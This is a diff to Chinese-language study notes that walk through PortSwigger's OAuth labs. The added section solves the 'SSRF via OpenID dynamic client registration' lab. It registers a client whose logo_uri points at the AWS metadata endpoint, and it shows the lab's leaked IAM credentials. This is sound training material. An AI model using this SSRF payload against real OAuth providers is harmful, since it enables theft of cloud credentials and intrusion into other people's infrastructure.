@@ -1,8 +1,10 @@
 ---
 title: OAuth 2.0 authentication vulnerabilities
 description: OAuth 2.0 authentication vulnerabilities
+# last_update:
+#   date: "2025-09-18T08:00:00+08:00"
 last_update:
-  date: "2025-09-18T08:00:00+08:00"
+  date: "2025-11-09T08:00:00+08:00"
 ---
 
 ## Lab: Authentication bypass via OAuth implicit flow
@@ -354,14 +356,187 @@ https://oauth-0a3b00690304f08a80f083e302720086.oauth-server.net/me
 }
 ```
 
+## Unprotected dynamic client registration
+
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
+
+https://portswigger.net/web-security/oauth/openid#unprotected-dynamic-client-registration
+
+```
+The name of this endpoint is usually provided in the configuration file and documentation.
+```
+
+通常會在 OAuth Provider 的 `/.well-known/openid-configuration`
+
 ## Lab: SSRF via OpenID dynamic client registration
+
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
 
 | Dimension | Description                                                                                             |
 | --------- | ------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/oauth/openid#unprotected-dynamic-client-registration               |
 | Lab       | https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration |
 
-<!-- todo-yus Burp Suite Pro -->
+P.S. 這題雖然有說需要 Burp Collaborator，但實際上不用，所以免費仔也可以解這題
+
+訪問 `/.well-known/openid-configuration`，回傳
+
+```json
+{
+  "authorization_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/auth",
+  "claims_parameter_supported": false,
+  "claims_supported": [
+    "sub",
+    "name",
+    "email",
+    "email_verified",
+    "sid",
+    "auth_time",
+    "iss"
+  ],
+  "code_challenge_methods_supported": ["S256"],
+  "end_session_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/session/end",
+  "grant_types_supported": ["authorization_code", "refresh_token"],
+  "id_token_signing_alg_values_supported": [
+    "HS256",
+    "ES256",
+    "EdDSA",
+    "PS256",
+    "RS256"
+  ],
+  "issuer": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net",
+  "jwks_uri": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/jwks",
+  "registration_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg",
+  "response_modes_supported": ["form_post", "fragment", "query"],
+  "response_types_supported": ["code"],
+  "scopes_supported": ["openid", "offline_access", "profile", "email"],
+  "subject_types_supported": ["public"],
+  "token_endpoint_auth_methods_supported": [
+    "none",
+    "client_secret_basic",
+    "client_secret_jwt",
+    "client_secret_post",
+    "private_key_jwt"
+  ],
+  "token_endpoint_auth_signing_alg_values_supported": [
+    "HS256",
+    "RS256",
+    "PS256",
+    "ES256",
+    "EdDSA"
+  ],
+  "token_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token",
+  "request_object_signing_alg_values_supported": [
+    "HS256",
+    "RS256",
+    "PS256",
+    "ES256",
+    "EdDSA"
+  ],
+  "request_parameter_supported": false,
+  "request_uri_parameter_supported": true,
+  "require_request_uri_registration": true,
+  "userinfo_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/me",
+  "userinfo_signing_alg_values_supported": [
+    "HS256",
+    "ES256",
+    "EdDSA",
+    "PS256",
+    "RS256"
+  ],
+  "introspection_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token/introspection",
+  "introspection_endpoint_auth_methods_supported": [
+    "none",
+    "client_secret_basic",
+    "client_secret_jwt",
+    "client_secret_post",
+    "private_key_jwt"
+  ],
+  "introspection_endpoint_auth_signing_alg_values_supported": [
+    "HS256",
+    "RS256",
+    "PS256",
+    "ES256",
+    "EdDSA"
+  ],
+  "revocation_endpoint": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/token/revocation",
+  "revocation_endpoint_auth_methods_supported": [
+    "none",
+    "client_secret_basic",
+    "client_secret_jwt",
+    "client_secret_post",
+    "private_key_jwt"
+  ],
+  "revocation_endpoint_auth_signing_alg_values_supported": [
+    "HS256",
+    "RS256",
+    "PS256",
+    "ES256",
+    "EdDSA"
+  ],
+  "claim_types_supported": ["normal"]
+}
+```
+
+找到 registration_endpoint = `https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg`
+
+嘗試
+
+```json
+{
+  "redirect_uris": [
+    "https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback"
+  ],
+  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+```
+
+回傳
+
+```json
+{
+  "application_type": "web",
+  "grant_types": ["authorization_code"],
+  "id_token_signed_response_alg": "RS256",
+  "post_logout_redirect_uris": [],
+  "require_auth_time": false,
+  "response_types": ["code"],
+  "subject_type": "public",
+  "token_endpoint_auth_method": "client_secret_basic",
+  "introspection_endpoint_auth_method": "client_secret_basic",
+  "revocation_endpoint_auth_method": "client_secret_basic",
+  "require_signed_request_object": false,
+  "request_uris": [],
+  "client_id_issued_at": 1762681363,
+  "client_id": "BlAFeJy0mfnjJ8FQrkL8c",
+  "client_secret_expires_at": 0,
+  "client_secret": "fnuNqzAag-cVrS4A9rE4mXwF7bSnxyRXYrW6-SvuQpqEp_uf4DqBvUBCzcZ6YwNI9vzSwEqi7jB7rqKscKdQHA",
+  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
+  "redirect_uris": [
+    "https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback"
+  ],
+  "registration_client_uri": "https://oauth-0ac10050042242f7803601e702ad00e1.oauth-server.net/reg/BlAFeJy0mfnjJ8FQrkL8c",
+  "registration_access_token": "hc9PcrcDZGucUC9c38xidpWMtRTRTLkp8DzSiaXjACz"
+}
+```
+
+之後瀏覽器訪問 /auth?client_id=BlAFeJy0mfnjJ8FQrkL8c&redirect_uri=https://0ae8009904e242b5801b0321005c00bb.web-security-academy.net/oauth/callback&response_type=code&scope=openid%20profile%20email，照著登入流程走，帳密輸入 `wiener:peter`，到 consent 頁面時，就會顯示 logo_uri（應該會破圖），右鍵 "在新分頁中開啟圖片"，就可以看到
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2025-11-09T09:18:29.854382424Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "XSJVLpKcjqPS2Qjs1uIM",
+  "SecretAccessKey": "2rP5YSGbYLJqgvTqxshFZneHqT4G6ABdkPdxx9Fd",
+  "Token": "INOn8DPr4qD39ClqfM6rSx6Pd4TqKwmhVj1TQJAVvtOCqhLObqq7vbY1hq7Cp7THenQ0nM5ytvpYvUlRvTRuBR55p8F4b7Jg263ab6UdbG34ebObN08AMA2yxhL8ndZOgkHtch43kIojkdNlmmwoyJ1MXE4dzH692yTNaKr6viTUs1ICyi5jiAntWHDxLXwRR8jqdihXu94V5blMsBv0ll9GBc2qW2hDpMYYc0jYtHzBbna9DNXZBvtieIs58nhK",
+  "Expiration": "2031-11-08T09:18:29.854382424Z"
+}
+```
+
+把 SecretAccessKey 的值 SubmitSolution 即可通關～
 
 ## 小結
 
